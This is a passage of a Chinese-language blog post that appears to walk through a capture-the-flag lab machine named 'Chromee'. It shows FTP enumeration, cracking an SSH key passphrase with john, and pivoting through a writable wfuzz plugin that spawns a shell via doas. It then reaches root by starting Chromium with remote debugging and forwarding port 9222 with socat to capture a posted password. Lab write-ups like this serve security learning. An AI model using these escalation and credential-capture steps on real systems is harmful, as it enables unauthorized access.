<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# cat zeus.conf</span><br><span class="line">permit follower as softly cmd /usr/local/bin/wfuzz</span><br><span class="line">permit nopass :softly as root cmd /usr/bin/chromium</span><br><span class="line">permit nopass :softly as root cmd /usr/bin/kill</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; cd /home</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||5941|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-x---    5 1000     1000         4096 Mar 21 08:18 follower</span><br><span class="line">drwxr-x---    5 1001     1001         4096 Mar 21 05:37 softly</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>

<p>还可以知道用户名</p>
<p>…文件是一个私钥，john可以爆破出来密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# john 1 --show</span><br><span class="line">id:cassandra</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# ssh follower@192.168.31.100 -i id</span><br><span class="line">Enter passphrase for key &#x27;id&#x27;:</span><br><span class="line">follower@Chromee:~$</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>follower下有一个cat.git和note.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:~$ cat note.txt</span><br><span class="line">Think about rotations and the cat’s secrets.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">47 is not just a number, it&#x27;s a twist of fate.</span><br></pre></td></tr></table></figure>

<p>这个47提示的很明显是rot47</p>
<p>cat.gif用convert可以分离出来12张图片，但是没有用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert cat.gif 1.jpg</span><br></pre></td></tr></table></figure>

<p>不是空间轴可以试试时间轴</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# identify -format &quot;%T &quot; cat.gif</span><br><span class="line">65 98 65 100 102 98 67 6 6 6 6 6 6</span><br></pre></td></tr></table></figure>

<p>将后面的6个6去掉扔进cyberchef中解密然后rot47解密</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee3.png"></p>
<p>得到了p3p573r，因为前面拿到的zeus.conf能够知道follower需要密码才能以softly执行wfuzz</p>
<p>先用find找到wfuzz的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find / -name &quot;wfuzz&quot; 2&gt;/dev/null</span><br><span class="line">/home/follower/.config/wfuzz</span><br><span class="line">/usr/local/bin/wfuzz</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/wfuzz    #这个就是wfuzz的路径</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find ./ -writable 2&gt;/dev/null</span><br><span class="line">./plugins/payloads/file.py</span><br></pre></td></tr></table></figure>

<p>在他的wfuzz的目录下找可以写的文件能找到file.py,cat一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ cat ./plugins/payloads/file.py</span><br><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>

<p>不用想了，肯定是作者降低难度了后门都留好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:~$ /usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u &quot;127.0.0.1&quot;</span><br><span class="line">Password:</span><br><span class="line"> /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">softly@Chromee:/home/follower$</span><br></pre></td></tr></table></figure>

<p>上传pspy64，能发现每隔一段时间root用户都会执行secript.sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2025/03/21 12:53:01 CMD: UID=0     PID=1504   | /bin/sh -c /root/script.sh</span><br><span class="line">2025/03/21 12:53:01 CMD: UID=0     PID=1505   | /bin/bash /root/script.sh</span><br></pre></td></tr></table></figure>

<p>结合题目名Chromee和前面得到的zeus.conf，能猜到肯定和浏览器有关系，运行linpeas.sh能看到/media下有一个debug.kdbx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# file debug.kdbx</span><br><span class="line">debug.kdbx: PDF document, version 1.7</span><br></pre></td></tr></table></figure>

<p>是一个pdf文件</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee4.png"></p>
<p>去网上查这个东西，谷歌浏览器自带这个工具chrome://inspect/，还有这个9222的默认端口（后面要用到）</p>
<p>先写一个authorized_keys</p>
<p>在网上查到开启远程debug的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox http://127.0.0.1</span><br></pre></td></tr></table></figure>

<p>因为靶机没有桌面，所以一定要带上–headless，不然会报错，启动好后再用socat端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softly@Chromee:~$ ./socatx64.bin TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee5.png"></p>
<p>用谷歌浏览器连接，打开第一个连接</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee6.png"></p>
<p>等一会就会发现向127.0.0.1/post.php发送一个key，不用base64解码，这个就是root的密码。</p>
<p>chromium的远程端口必须要是9222默认端口否则他监听不到就很难受</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">lvzhouhang</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">60</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">22</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lvzhouhang</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="站点总字数">327k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">4:57</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/xxx/anime.min.js"></script>
  <script src="/xxx/velocity/velocity.min.js"></script>
  <script src="/xxx/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
